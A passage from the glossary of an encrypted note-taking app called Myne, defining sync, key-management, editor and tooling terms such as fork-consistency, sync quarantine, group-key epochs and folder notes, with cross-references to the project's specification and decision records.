Two properties are worth stating because they cost real work. The byte is **global, not per-format**, so a bump discards every cached extraction of every format — the `0x02`→`0x03` OCR bump re-runs ASR over every audio attachment for no gain; that cost is accepted and the structural fix is tracked separately. And because the OCR weights are *bundled* rather than user-chosen, the payload records no `model_hash` for them, which makes this byte their only staleness signal: **changing the bundled OCR weights requires bumping it.** (MYND-328, MYND-441)

### **fall-to-rebuild** &nbsp; 📋 *Protocol*

The fallback path for loading the [search index](#search-index) when the cached `vault.search` blob (`spec/protocol.md` §9.6) cannot be trusted or used — blob absent, magic / version mismatch, AEAD-verification failure, or an unreadable staleness manifest. Instead of incrementally reconciling the cached index against the notes, the client **rebuilds it from scratch** by decrypting every `.myn`. Rebuild always recovers the correct index, so `vault.search` carries no integrity-of-search burden: a disk attacker who deletes or corrupts it costs the user one slower unlock, nothing more. The complement of the **incremental reconcile** happy path (re-index only the notes whose `content_nonce` changed) — fall-to-rebuild is the always-correct safety net beneath it (`decisions.md` 2026-05-31).

Used in: `spec/protocol.md` §9.6.4

### **full-reconcile** &nbsp; 📋 *Protocol*

The Phase 2 sync recovery mode a device enters when incremental catch-up is impossible or untrusted — a [soft-retired](#soft-retire) device returning past the [tombstone horizon](#tombstone-horizon), or any device whose cursor is too stale to trust. Instead of replaying missed deltas, the device reconciles its entire local state against the server's authoritative manifest (the same decryption-free [content_nonce](#content_type) reconcile as [fall-to-rebuild](#fall-to-rebuild), §9.6.4): notes absent from the authoritative manifest are NOT resurrected, and local-only notes fall to a [keep-both conflict](#keep-both-conflict-resolution) copy rather than silently re-appearing. The structural defence against a server-driven resurrection past horizon-GC. Phase 2.

Used in: `spec/sync-protocol.md` §11

### **sync quarantine** &nbsp; 📋 *Protocol*

The client-side **drop disposition** of a [full-reconcile](#full-reconcile): a previously-synced note absent from the authoritative roster (deleted + horizon-GC-reclaimed remotely) is **moved aside** into the device-local `quarantine/` directory — never destroyed, never re-uploaded (`spec/sync-protocol.md` §11.3 "Reclaimed-record visibility"). Re-uploading would resurrect deleted content server-side and lose the reclaimed record's version CAS; destroying would let a lying server erase user data. Doubles as the hostile-server ceiling for roster manipulation: hiding records from the roster can at most cause a recoverable local move, gated to reconcile walks, never echoed back. A sync reset (`clear_device_local_sync`) deliberately does not touch it — it holds user data.

Used in: `spec/sync-protocol.md` §11.3, `decisions.md` 2026-07-17

### **favorites** &nbsp; 📦 *Product*

The user's chosen shortcut list of notes, surfaced in a dedicated Favorites section pinned above the sidebar tree. Persisted as the `favorites` field of `vault.prefs` — a **sequence** array of note UUIDs only (display order is the payload; NFC-normalized, not sorted, not deduped, omitted-when-empty), so favoriting is cheap view-state (a prefs write, no `.myn` re-encrypt) that reverts to empty on a tampered/absent blob (`spec/protocol.md` §9.5.2, §9.5.5). A favorited note **also** keeps its normal position in the tree — favoriting is a shortcut, not a move — so it renders in two rows (disambiguated by section-qualified keys); selection is keyed by note-id (both rows highlight) and keyboard navigation visits it once. Add via a hover star, the context menu, or dragging a note into the section; remove via star/menu only. A favorite UUID with no live note is ignored at render and pruned on the next write. See also [item order](#item-order), [PrefsView](#prefsview). (MYND-183)

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-02

### **filter AST** &nbsp; 📋 *Protocol*

The recursive, **closed-allow-list** tree that expresses a [saved view](#saved-view)'s query (Saved Views epic, MYND-272/MYND-273). A node is a boolean combinator (`and` / `or` / `not`) over a fixed leaf set — `hasTag` and `inFolder` (both subtree-inclusive), full-text `search`, a typed `property` comparison (`== != > < >= <= contains`, date compares on frontmatter dates only), and the degenerate `all`. There is deliberately **no** arithmetic / `list.map` / formula node: the type cannot represent one, so the query layer can never evaluate arbitrary code (the "no databases / no formula" anti-feature of [vision](#vision) expressed in the type system). Serialized canonically (`#[serde(tag = "kind")]`, camelCase kinds + operator literals) inside the `saved_views` field of [vault.prefs](#vaultprefs); the query engine reads it and the renderer never re-derives it. See also [saved view](#saved-view), [property](#property). (MYND-272 / MYND-273)

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-15

### **field clock** &nbsp; 📋 *Protocol*

The per-field LWW timestamp of the Phase 2 prefs sync (`sync-protocol.md` §10.2, MYND-478): an epoch-milliseconds integer, one per [shared pref](#shared-pref) LWW field, or per ENTRY of a per-key map (`device_names/<key>`, `item_colors/<key>`, `folder_icons/<key>`, `item_order/<container>`) or of a clocked set-union field (`deliberate_folders/<foldedEntry>`, `archived_folders/<foldedEntry>`, `spell_languages/<rawCode>`, myne-md/myne#613; the two monotone egress sets are never stamped and have no key here, see [removal clock](#removal-clock)), stored in the additive `field_clocks` map inside the encrypted [vault.prefs](#vaultprefs) payload (`spec/protocol.md` §9.5.2) and stamped by the setter that last changed the field. The merge takes the newer clock per field, counts an absent clock as 0 (pre-feature blobs), and breaks equal clocks byte-lexicographically toward the greater value (the attachments-catalog `filename` precedent), so replicas converge without coordination. Per-field (rather than per-blob) clocks are what let concurrent edits to *different* fields both survive.

Used in: `sync-protocol.md` §10.2, `spec/protocol.md` §9.5.2; `decisions.md` 2026-07-13

### **first-load bundle budget** &nbsp; 🛠️ *Tooling*

The web client's ceiling on the bytes a browser must fetch before it can run the application — the entry module, its transitive *static* import graph (what Vite emits as `modulepreload`), the stylesheet, and the HTML. Lazily-imported chunks (mermaid, the drawing canvas, the locale catalogues) are deliberately excluded: counting them would make the budget indifferent to whether code-splitting works. It is a **ratchet, not an invented number**: the raw and gzip figures were measured from a complete build into `web/bundle-baseline.json`, and `scripts/check-web-bundle-budget.mjs` fails the web CI lane when a build exceeds them by more than the recorded margin, so a bundle increase becomes an edit someone makes and signs (`--update`) rather than drift nobody sees. The gzip number is the one that fails the build (it is the transfer size); raw bytes are reported because they are what the browser must parse. It also carries one architectural assertion — the wasm core must not appear in the first-load graph at all, since it is needed at unlock rather than at first paint. Shipping the full unsubset Inter face is recorded against this budget as a deliberate cost (`decisions.md` 2026-07-28).

Used in: `decisions.md` 2026-07-28; `scripts/check-web-bundle-budget.mjs`, `web/bundle-baseline.json`

### **fixture** &nbsp; 🛠️ *Tooling*

One named set of canned `invoke` responses plus the boot state that makes a catalogue state reachable (myne-md/myne#832). A fixture lives in `stories/fixtures/` and is referenced by name from a [story catalogue](#story-catalogue) entry, so situations that recur (no vault, locked, unlocked, a corrupt `vault.meta`) are defined once and shared. Fixtures are synthetic by contract: `tests/stories/fixtures.test.ts` and `scripts/check-stories-bundle.mjs` reject a recovery phrase or an account-number-shaped string, because a hand-authored fixture is exactly how a secret would reach a served page. See also [story host](#story-host).

Used in: `decisions.md` 2026-10-05; `stories/fixtures/index.ts`

### **focus mode** &nbsp; 📦 *Product*

The editor's distraction-free writing state (MYND-348): a `Mod-Shift-F` toggle fades the in-app chrome (sidebars, tab strip, [bottom bar](#bottom-bar), floated title-bar cluster) and centers the column, so only the words remain. The fade is **in-app only** — a CSS rule keyed on the editor root's `data-focus-active` attribute, never OS fullscreen (no Tauri window-API capability is added). The active state is **ephemeral** React state (opt in each session, never auto-entered, not persisted to any blob). Exit via the toggle or **Esc** at low keymap precedence (the editor's autocomplete / multi-cursor consume Esc first). v1 also ships [typewriter scroll](#typewriter-scroll) and [line-focus dimming](#line-focus-dimming), each a Settings → Editor toggle (the `editor_focus_typewriter` / `editor_focus_dim_inactive` MYP1 fields, default on); the command palette and Settings open over focus and return to it on close. Threat-neutral (UI state + two cosmetic prefs fields). See also [typewriter scroll](#typewriter-scroll), [line-focus dimming](#line-focus-dimming).

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-17 (MYND-348)

### **folder** &nbsp; 📦 *Product*

A *virtual* organizational container for notes, shown as a nested tree in the sidebar. A note's folder is a slash-delimited path stored in its `folder:` frontmatter (`spec/markdown-dialect.md` §3.6.1); the on-disk layout never reflects it — `notes/<uuid>.myn` stays flat (`spec/protocol.md` §9.1), so folder structure is encrypted metadata (`threat-model.md` AS3) reconstructed client-side. The tree is a derived view: `dedup_union` of the ancestor-expanded paths from every note's `folder:` field and the [deliberate-folder](#deliberate-folder) set, under case-fold + NFC identity (`spec/markdown-dialect.md` §3.6.2). A folder carried only by notes is *implicit* and vanishes when its last note leaves; a deliberate folder persists when empty. Folders and folderless notes share a single interleaved tree at every level, ordered by [item order](#item-order) (MYND-183) — a folderless note is not bucketed into a separate section but renders at the root level alongside top-level folders. Distinct from a *tag* (a separate, non-hierarchical organizational axis that coexists with folders). See also [item order](#item-order).

Used in: `spec/markdown-dialect.md` §3.6.1–3.6.2, `spec/protocol.md` §9.1, §9.5.2; `decisions.md` 2026-05-29

### **folder anchor** &nbsp; 📦 *Product*

The folder a [conversation](#conversation) is scoped to, recorded as the optional `folder` key on its `vault.chats` row (`protocol.md` §9.23) so the agent hub can say what a conversation is about without opening it. A conversation carries **at most one** anchor: a [note anchor](#note-anchor), a folder anchor, or neither, which is a vault-general conversation. Additive and optional, the same shape the note anchor uses, and both are written at create time (myne-md/myne#848).

Used in: `protocol.md` §9.23, `decisions/ai/0662`

### **folder lock** &nbsp; 📦 *Product*

The rule that bounds what an [agent run](#agent-run) may do with the field that decides which folder a note is in, because that field is what `ai_excluded_folders` is keyed on (SYNC-14). It is checked **both ways**. An anchored edit may not change a note's `folder:` line at all, under either approval label. A [move verb](#move-verb) is the one write that may change it, and it is refused when the note is already in an excluded folder and when the destination is one, so neither entering nor leaving an excluded folder is reachable. The destination is written as a quoted YAML scalar when the value needs it, so the folder the clamp compares and the folder the app resolves are the same string (myne-md/myne#848). Supersedes the refusal clause of `decisions/ai/0554`; current form in `decisions/ai/0662`.

Used in: `decisions/ai/0662`, `threat-model.md` §7

### **folder note** &nbsp; 📦 *Product*

A note designated the **index note** of its [folder](#folder) via the value-strict `folder_index: true` frontmatter flag — the sixth [Myne-managed canonical frontmatter field](#myne-managed-canonical-frontmatter-field) (`spec/markdown-dialect.md` §3.6.1). The note indexes whichever folder its own `folder:` names; the binding is the boolean alone and carries **no path**, so a folder rename rewrites `folder:` and the binding follows for free (rename drift is structurally impossible). A folder has **exactly one** folder note. It is **hidden from the sidebar folder tree** — no separate row, no pin, no badge — and is opened (or lazily created on first activation) by **double-clicking the folder**; the undesignate inverse lives on the folder's context menu ("Remove folder note"). The hiding is **sidebar-tree-only**: unlike a [note template](#note-template) or a trashed note (hidden everywhere), a folder note stays a fully real, enumerable note in **search, saved views, backlinks, the graph**, and [`[[<folder>/]]`](#folder-target-wikilink) resolution — it is content the user reads, not a hidden skeleton (decisions.md 2026-06-27, supersedes the original "fully visible, pinned, badged" behaviour). **Gated by the `folder_notes_enabled` vault preference, default off (myne-md/myne#661)**: with the feature off (the default), the create/designate entry points are hidden and `folder_index: true` is not honoured for presentation, so the note renders and opens as an ordinary note. The switch touches no bytes (the flag stays on disk), so turning it back on restores exactly the behaviour above. Value-strict exactly like `template:`: only the canonical unquoted `true` designates it; `1` / `yes` / `"true"` / absence leave the note ordinary. Owned by the folder-note designate / undesignate actions (`src/notes/folderNote.ts`) only — never written by body autosave; surgery via `patchFolderIndexField`, read via `readFolderIndexFromFmBody`. If two in-folder notes both carry the flag (legacy / imported data only — the UI now prevents a second designation), a deterministic winner is chosen (smallest `note_uuid`) and the rest stay visible, flagged for the user to resolve. Rides the existing `.myn` AEAD envelope — no new magic byte, no AAD / version bump, no on-disk-layout change (within v0.1; forward-incompatible-by-design with a later major version). See also [folder](#folder), [folder-target wikilink](#folder-target-wikilink), [Myne-managed canonical frontmatter field](#myne-managed-canonical-frontmatter-field). (MYND-370)

Used in: `spec/markdown-dialect.md` §3.6.1, `spec/wikilink.md` §5.5; `decisions.md` 2026-06-17

### **folder-target wikilink** &nbsp; 📦 *Product*

The trailing-slash wikilink form `[[<folder>/]]` (form 11, `spec/wikilink.md` §2 / §5.5) that resolves to a folder's [folder note](#folder-note) — its index note (`folder_index: true`). The trailing `/` is the sole discriminator from a title-only target: `[[Projects]]` targets a note titled "Projects", `[[Projects/]]` targets the index note of the *folder* "Projects". It reuses the ordinary wikilink machinery — backlinks, hover, graph — so it is a different spelling of "link to this note", not a different link kind. Two distinct broken hints: **"(no folder note)"** when the folder exists but has no index note, **"(no match)"** when the folder does not exist. A folder rename refreshes inbound folder-target links' path segment on the best-effort §8.1 pass (the index-note binding itself is path-free, so the target note tracks the rename regardless). Recognized and resolved but not the canonical authoring emission (Myne emits the note-targeting form 6); round-trips byte-for-byte. See also [folder note](#folder-note), [bidirectional links](#bidirectional-links). (MYND-370)

Used in: `spec/wikilink.md` §2, §5.5, `spec/markdown-dialect.md` §3.5; `decisions.md` 2026-06-17

### **footnote definition** &nbsp; 📦 *Product*

A `[^N]: definition text` block in the Myne dialect (`spec/markdown-dialect.md` §3.4), where `N` is any non-whitespace identifier. Recognized by a custom footnote `MarkdownConfig` (`src/dialect/lezer/footnote.ts`, MYND-153) as a `FootnoteDefinition` **composite** block; position is not normative (§3.4). The body continues onto blank or ≥4-column-indented following lines (Pandoc / GitHub continuation), so a footnote may hold multiple paragraphs, fenced code, or blockquotes; a footnote-definition line interrupts an open paragraph so consecutive `[^1]:`/`[^2]:` lines are distinct. In the Phase 1 editor the in-source line is left byte-stable in place (never moved or rewritten — D1 hard rule C1), de-emphasized off-cursor and revealed at full prominence on-cursor, while a derived read-only "Footnotes" list at document end renders every definition's text (the list is a VIEW, not a serialization). A definition that no [footnote reference](#footnote-reference) points at is collected and flagged *unreferenced*. Distinct from a [reference link definition](#link-reference-definition) (`[ref]: url`), which a footnote definition outranks at parse.

Used in: `spec/markdown-dialect.md` §3.4, §8; `decisions.md` 2026-05-31; `src/dialect/lezer/footnote.ts`, `src/editor/decorations/footnote.ts`

### **footnote reference** &nbsp; 📦 *Product*

An inline `[^N]` marker in the Myne dialect (`spec/markdown-dialect.md` §3.4), where `N` is any non-whitespace identifier (typically an integer, but `[^note]` / `[^a1]` are permitted). Recognized as a `FootnoteReference` node (`src/dialect/lezer/footnote.ts`, MYND-153) and rendered in the Phase 1 editor as a small superscript glyph (the identifier) with the `[^` / `]` brackets hidden off-cursor; the cursor entering the span reveals raw `[^N]` for editing (the cursor-aware reveal shared with links). Clicking a reference whose [footnote definition](#footnote-definition) exists jumps the cursor to that definition; an *orphan reference* (no matching definition) renders a muted error-tinted variant and clicking is a safe no-op.

Used in: `spec/markdown-dialect.md` §3.4, §8; `decisions.md` 2026-05-31; `src/dialect/lezer/footnote.ts`, `src/editor/decorations/footnote.ts`

### **fork-consistency** &nbsp; 🏗️ *Construction*

The integrity property a [vault head](#vault-head) provides against a malicious sync server (**TB5**) that cannot read or forge content but can still **rollback** (serve an older authentic blob), **withhold** (hide an update), or **equivocate / fork** (show different devices divergent histories). Following SUNDR (OSDI 2004): every update is committed into an unforgeable, monotonic, hash-chained head, so the server cannot *heal* a fork — once it shows two devices divergent heads, their [version vectors](#version-vector-vv) never re-converge and the split surfaces on the next cross-read. Fork detection is therefore **delayed and in-band** (caught when devices observe each other's state) or immediate only via an [out-of-band fingerprint](#bootstrap-fingerprint); a lone client with no external comparison cannot detect equivocation (the SUNDR theorem). Withholding of a device's *own* work is caught in-band; withholding of *other* devices' work / global staleness is best-effort. Phase 2.

Used in: `spec/sync-protocol.md` (vault head); `threat-model.md` §7

### **`format/` crate** &nbsp; 🛠️ *Tooling*

The in-repo Rust workspace member (`myne-format`) that carries the host-free half of Myne's on-disk format: the `VaultIo` filesystem-seam trait, the closed `IoFailureKind` error categorization, the export-naming vocabulary, the `NC05` note decode path, and the `MYB1` backup-container read half. Extracted from `myne-core` so the [myne-decrypt](#myne-decrypt) CLI can read a vault without pulling `myne-core`'s unconditional TLS stack (`rustls`+`ring`) and ML runtime (`rten`, `image`). Native-only by design: the export walk and the MYB1 container read half use `std::fs` directly and are gated out of the wasm build; the `VaultIo` trait is carried for the CLI's future use.

Used in: `decisions.md` 2026-09-07 (myne-md/myne#166)

### **forward-incompatible major version** &nbsp; 📋 *Protocol* (deep entry, *Myne-divergent*)
Myne's architectural commitment that each major protocol version (v0.1, the next major version, v006, …) is a closed, complete specification with distinct magic bytes, AAD prefix, and context-string prefix. Cross-major reads happen only via explicit user-initiated migration (`spec/protocol.md` §10.4); a later-major client refuses to silently parse a v0.1 blob, and vice versa. The choice contradicts the additive-extension model common in TLS 1.0–1.2 and OpenPGP; the reasoning is that those protocols' downgrade-attack history (POODLE, FREAK, Logjam, MEGA-2022) shows additive extension to be a structural risk. The next major version's anticipated changes (PQ hybrid wrap, MLS multi-device, OPAQUE auth, KT log) are too deep to be additive in any honest sense.

Used in: `spec/protocol.md` §10.1

### **forward secrecy** &nbsp; ⚠️ *Threat*

The property that compromise of a long-term key does not enable decryption of past messages encrypted with derived ephemeral keys. Myne v0.1 does **not** provide forward secrecy — the persistent `itemsKey` is reusable across all notes for the vault's lifetime. A later major version's roadmap introduces per-epoch `itemsKey` rotation that would provide forward secrecy by deleting old epoch keys after migration.

Used in: `threat-model.md` §7; `spec/protocol.md` §3.3 (forward-compat note)

### **free tier** &nbsp; 📦 *Product*

The permanent no-cost tier of [hosted sync](#hosted-sync): 250 MB storage / 3 devices per account, full protocol, full speed — differentiation from [Myne Sync](#myne-sync) is quantitative only (storage + device count), never speed, features, or guarantees (`decisions.md` 2026-07-13). Its existence revises the `server-protocol.md` §5.3 Sybil posture: a permanent free anonymous registration surface is accepted, bounded by the small quota, the device cap, and the registered-account ceiling — the payment gate remains the primary Sybil resistance for *meaningful* storage. Abandoned free accounts are never reclaimed: doing so would require persisting a new behavioral marker, and the zero-new-observation principle wins over the (bounded, accepted) dead-account storage cost.

Used in: `decisions.md` 2026-07-13

### **frontmatter** &nbsp; 📦 *Product*

The optional YAML metadata block delimited by `---` lines at the top of a note's decrypted markdown (`spec/markdown-dialect.md` §3.6). Carries the thirteen Myne-managed canonical fields (§3.6.1) plus arbitrary user-authored keys, all preserved byte-for-byte on write (unknown-field-preservation + §6 C1). The editor's recognizer only *delimits* the block; a separate read-only [property](#property) parse (Saved Views / MYND-271) reads the YAML *body* to type each key for the [property index](#property). Not to be confused with the inline `#tag` / frontmatter `tags:` distinction (§3.7).

Used in: `spec/markdown-dialect.md` §3.6

### **γ1+γ2 hybrid autosave** &nbsp; 📦 *Product*

The canonical Myne autosave call-pattern locked in `decisions.md` 2026-05-07 "`note_update` IPC … UI-level autosave coalescing": a UI-side state machine composing **γ1 idle-debounce** (a save fires after the user has been idle for N milliseconds since the last keystroke) + **γ2 max-debounce** (a save fires regardless every M milliseconds during sustained typing, so a writer who never pauses still gets a save) + a **latest-wins single-in-flight gate** (if a save is already in flight when another fire is due, the in-flight completes first, then a single follow-up save fires with the latest body — no IPC thrashing) + canonical **flush triggers** (`flush-on-vault-lock` from the original entry; `flush-on-blur` and `flush-on-window-close` pinned by `decisions.md` 2026-05-15). Phase 1 v0.1 timings are N=1000ms, M=10000ms. The pattern lives entirely in the UI; the Rust `note_update` command is stateless and plaintext-blind. Backend-side queueing (γ3) was explicitly rejected because the `notes` plugin holds no own state per `decisions.md` 2026-05-07 "notes plugin scaffold". The Greek-letter naming is internal shorthand inherited from the 2026-05-07 MYND-27 grill where four call-pattern alternatives were enumerated (α stateless, β stateful-handle, γ hybrid, δ deferred — α + γ shipped).

Used in: `decisions.md` 2026-05-07 (pattern), 2026-05-15 (concrete timings); MYND-81

### **gating row (manual test roster)** &nbsp; 🛠️ *Tooling*

One observation on one client that stops the tag when it fails. A row is the `(item, client)` pair rather than the item, because an observation naming macOS, Linux and Windows is three sittings; counting once per item understates the roster by more than half. Which rows gate is recorded in `scripts/manual-test-ratchet.json` as a tier list plus a client list, not implied: at the first measurement the gate is the `core` tier on every client this release ships, seven of the eight, 58.9 of 163.7 hours. The rest is walked and recorded and does not block yet, and that share only shrinks. A failed gating row is passed anyway only by `verdict: override` with a written, length-checked reason that lands in git.

Used in: `scripts/manual-test-plan.mjs`, `scripts/manual-test-ratchet.json`, `scripts/manual-test-verified.json`

### **ghost-text** &nbsp; 📦 *Product*

The dimmed inline completion the writing-assistant ([local inference](#local-inference)) shows at the cursor: a `Decoration.widget` overlay (never in the document buffer) rendering the model's short continuation in `--fg-3` italic, accepted with **Tab** (inserts it as plain markdown, one undo step) and dismissed by **Esc** or any edit. Fired on a paused cursor by a debounced CM6 `ViewPlugin` that cancels any in-flight inference on a doc/viewport change so a stale suggestion never lands. Composed into the editor only when `ai_enabled` (and the note is not an [AI-excluded folder](#ai-excluded-folder)). Modeled on the `spell.ts` StateEffect→StateField loader pattern (MYND-410).

### **graph list** &nbsp; 📦 *Product*

The text alternative to the canvas in the [graph view](#graph-view): the same model rendered as a keyboard- and screen-reader-navigable list of nodes and their links (myne-md/myne#727). It exists because the canvas is a picture with no focusable children, so a reader who cannot see it, or a keyboard user, had no way to walk the graph. Activating a row opens the note, and a tag row filters to that tag, matching what a click does on the canvas. The list view never mounts the lazy canvas chunk, so a reader who wants text never downloads the layout engine.

Used in: `src/notes/components/GraphList.tsx`; myne-md/myne#727

### **graph view** &nbsp; 📦 *Product*

The visualization of `[[wikilink]]` relationships between notes as a force-directed graph. Myne Phase 1 includes a minimal graph view, [d3-force](#d3-force) layout + a hand-rolled canvas renderer, in a separate, lazy-loaded panel (`vision.md` Phase 1 Scope). Nodes are notes, plus, in the whole-vault view, one [tag node](#tag-node) per tag claimed by an enabled bare-`hasTag` [color group](#color-group) rule (myne-md/myne#727, `decisions/ui/0602`, which supersedes the notes-only clause of `decisions.md` 2026-06-08); folders remain a filter dimension only. Edges are resolved cross-note references, plus one edge per (tag node, note) pair.

Used in: `vision.md` Phase 1 Scope

### **group key** &nbsp; 🗝️ *Key/identifier*

A random 32-byte shared content authority for a B2B vault. It opens the current
group content epoch but never opens the owner-only `root_key` authority. Removing
a member retires its epoch and generates a fresh group key for the remaining
members; it cannot revoke ciphertext the removed member already copied.

Used in: `design-notes/protocol/0594-b2b-group-key-and-revocation-hierarchy.md`; `docs/spec/protocol.md` §3.4

### **group-key epoch** &nbsp; 🗝️ *Key/identifier*

The monotonically increasing generation number of a B2B vault's [group
key](#group-key), starting at 1. Removing a member retires the current epoch and
mints the next (`epoch + 1`); a reader accepts a strictly-greater owner-signed
epoch only and refuses an EQUAL epoch rather than tie-breaking, so two
conflicting rosters at one epoch cannot both be canonical. The epoch is carried
in the owner-signed roster and bound into the group-key-wrap AAD.

Used in: `design-notes/protocol/0594-b2b-group-key-and-revocation-hierarchy.md`; `docs/spec/protocol.md` §9.3.2

### **group package** &nbsp; 🗝️ *Key/identifier*

One live member's owner-signed recipient record for a group-key epoch: a
canonical-JSON payload (`account_number_hash_hex`, positive `group_key_epoch`,
`recipient_fingerprint_hex`, `wrapped_group_key_hex`) under the signature class
`"myne.group-package v1|"`, where the wrapped key is the PQ-hybrid person
envelope over the 32-byte `group_key`. A reader verifies both owner signatures,
requires the expected vault, epoch and local fingerprint, and requires byte
equality with that member's live row in the already-verified roster.

Used in: `docs/spec/protocol.md` §9.3.3

### **group roster** &nbsp; 🗝️ *Key/identifier*

The owner-authored, owner-double-signed membership list of an `NTV6` vault: a
canonical-JSON payload (`account_number_hash_hex`, positive `group_key_epoch`,
`owner_fingerprint_hex`, and `members` strictly sorted by fingerprint) under the
signature class `"myne.group-roster v1|"`. It lives SEALED (under the group tier,
§9.3.3) in the `NTV6` `vault.meta`, so the sync server reads neither the member
fingerprints nor the display names. A member verifies it from the pinned owner
public half; neither `root_key` nor a root-derived membership key participates.

Used in: `docs/spec/protocol.md` §9.3.3


### **run indicator** &nbsp; 📦 *Product*

*(Alias: the orb.)*

The small animated mark on the [agent hub](#agent-hub) tab that says a run is in flight, beside the word that says the same thing. It animates only while the run is RUNNING — not while a settled run's view is still open — pauses when the tab is hidden or the mark is off-screen, holds one static frame under `prefers-reduced-motion`, and is `aria-hidden`, because the state's meaning is in the text next to it. It is a **named exemption** in the motion canon rather than a permitted pattern: `PRODUCT.md` principle 4 forbids a pulsing state indicator, `decisions/ui/0632` established the by-name mechanism, and `scripts/check-motion-canon.mjs` knows both of its keyframes (`decisions/ai/0635`). It is **not a spinner** — a spinner says "waiting for IO" and turns at IO's pace; this reports a model working — and **not a progress bar**: nothing about an agent run is measurable in advance.

Used in: `decisions/ai/0635`; `decisions/ui/0632`

### **roster continuity** &nbsp; 📋 *Protocol*

A live roster row's identity-continuity state in an `NTV6` group roster:
`current` (no prior identity), `changed` (the row's fingerprint superseded a
previous one and the owner has not vouched for it) or `owner-confirmed` (the
owner re-confirmed the transition). The UI renders `changed` and
`owner-confirmed` differently on purpose. Distinct from the fork-consistency
"continuity guarantee" sense of continuity used by the version vector.

### **group retirement record** &nbsp; 🗝️ *Key/identifier*

An owner-double-signed (`"myne.group-retirement v1|"`) fixed 33-byte record that
names the namespace a retired group-key epoch applied to (group-key or content),
the retired epoch and its immediate replacement (`retired + 1`). It carries NO
timestamp, so a removed member's package stream cannot be ordered by it, and
both signature halves are mandatory, so an untrusted server cannot forge a
retirement.

Used in: `design-notes/protocol/0594-b2b-group-key-and-revocation-hierarchy.md`; `docs/spec/protocol.md` §9.3.4

### **hash-pinned dependencies** &nbsp; 🛠️ *Tooling*

Lockfiles checked into the repository that record the exact SHA hash of every direct and transitive dependency. Myne covers Cargo (Rust), **pnpm** (the desktop and web clients share one `pnpm-lock.yaml`; pnpm is canonical, never npm or yarn), Go modules (server), and the wasm build's pinned toolchain + crate graph. Updates require explicit review.

Used in: `threat-model.md` §6, §7

### **head_id** &nbsp; 🗝️ *Key/identifier*

The identity of a single [vault head](#vault-head): `head_id = SHA-256(serialized full head record INCLUDING its head_mac)`. Hashing over the MAC (not just the pre-MAC content) makes the hash-DAG bind **authentication**, not merely content. A head's parent links (`prev_head_hash[]`) are the `head_id`s of its parents — one parent = linear extension, two = a legitimate concurrent-push merge (byte-sorted lexicographically for encoding determinism). Domain-separated from the [vault-head manifest](#vault-head-manifest) hash and the §5.1 [CTX commitment](#ctx-commitment) by a distinct leading prefix, so no SHA-256 input is reinterpretable as another's. Phase 2.

Used in: `spec/sync-protocol.md` (vault head)

### **head author id** &nbsp; 🗝️ *Key/identifier*

The vault-scoped pseudonymous identifier a signed [vault head](#vault-head) carries so a peer can resolve which key signed it (`decisions/protocol/0603`, myne-md/myne#711). It is a deterministic function of the author's person public halves and the vault's `account_number_hash` under the hash domain `"myne.head-author v1|"`, so the same person shows a different id in each vault and the server cannot link one person across vaults. A verifier derives the candidate ids from the roster's public halves and matches; a single-user vault resolves it against the device's own person key. Deliberately not the raw [person fingerprint](#person-keypair).

Used in: `design-notes/protocol/0603-b2b-member-sync-wire-and-signed-head.md`; `docs/spec/sync-protocol.md` §3

### **invite code** &nbsp; 📦 *Product*

A single shared admission code a sync-server operator may configure (`MYNE_INVITE_CODE`) to close new-account registration to a known group (`decisions/sync/0625`, myne-md/myne#800). With it set, `POST /auth/register` refuses an account the server has never seen unless the request carries the matching code; with it unset, registration is open (the self-host and fresh-clone default). It is a **pure door**: compared in constant time, never logged, and never associated with the account, so the server keeps no code-to-account record and learns nothing it did not already (AS9 stays its only identifier). It gates **new accounts only**: a device joining an existing account sends no code. Stored device-locally by the client beside the [sync endpoint](#sync-endpoint) (never synced, never backed up) because it is a shared door word rather than a per-user credential. Not the [vault invite](#vault-invite): that invites a person into a vault, this admits an account to a server.

Used in: `design-notes/sync/0625-hosted-sync-access-is-gated-by-a-server-configured-invite-co.md`; `docs/spec/server-protocol.md` §5.3

### **invite relay** &nbsp; 📦 *Product*

The asynchronous delivery of a [vault invite](#vault-invite) (`decisions/protocol/0603`, myne-md/myne#711). The owner's authenticated session posts the invite SEALED to the recipient's [person account](#person-account); the server stores it opaquely and releases it to that account on claim. The outer routing frame carries only the recipient account id and the vault id, so the server reads no fingerprint, no public half and no group key. The QR or pasted code remains only as the out-of-band SAS compare channel. Routes: `POST /b2b/invites`, `GET /b2b/invites`, `POST /b2b/invites/{invite_id}/claim`, plus the owner-side claimed-versus-pending list `GET /b2b/vaults/{account_hash}/invites` (`decisions/protocol/0605`).

Used in: `design-notes/protocol/0603-b2b-member-sync-wire-and-signed-head.md`; `docs/spec/server-protocol.md` §3

### **heading record** &nbsp; 📦 *Product*

The per-note record set the structured index ([`vault.indices`](#vaultindices) / [`MYI1`](#myi1), `spec/protocol.md` §9.8.2) holds for each heading in a note body: `{text, level}` and nothing else. The source for the vault-wide `[[##` picker, replacing a read-and-reparse of every note body on each index change. Sibling of the [line-task projection](#line-task-projection) and the [block anchor](#block-anchor) records in the same payload, and the cheapest of the three: the client fills it from the parse an index update already runs, so it costs no extra pass.

Two deliberate omissions. The **byte offsets** a heading scanner also produces are not stored: they serve heading folding, which runs against the open note's own parse, and a vault-wide copy of them would go stale. And a row carries **no note title or folder**, unlike a block-anchor row, because the consumer must join against the resident note-set regardless, to drop trashed and template notes, and that join already holds both. The index itself is trash-blind.

Used in: `spec/protocol.md` §9.8.2; `decisions.md` 2026-09-19 (0594)

### **HKDF (HKDF-SHA-256)** &nbsp; 🔐 *Primitive*

The HMAC-based Extract-and-Expand Key Derivation Function defined in RFC 5869, instantiated with SHA-256. Myne calls `HKDF-Extract(salt=zero_32, IKM=root_key)` once per session to produce the PRK, then `HKDF-Expand(PRK, info=context_string, L)` for each subkey. All HKDF-Expand invocations go through the `derive_key` helper (§3.2.1) — direct invocation is forbidden.

Used in: `spec/protocol.md` §3.2
Reference: RFC 5869.

### **HNDL (Harvest Now, Decrypt Later)** &nbsp; ⚠️ *Threat*

A class of attack where an adversary captures encrypted traffic or storage today, expecting future cryptographic advances (notably quantum computing) to enable decryption later. Myne v0.1 does not provide post-quantum protection vault-wide; the B2B person path ships a hybrid ML-KEM-768 + Ed25519 wrap and ML-DSA-65 + Ed25519 signatures now (`decisions/protocol/0592`), and a later major version extends hybrid X25519 + ML-KEM-768 to sync-server scenarios.

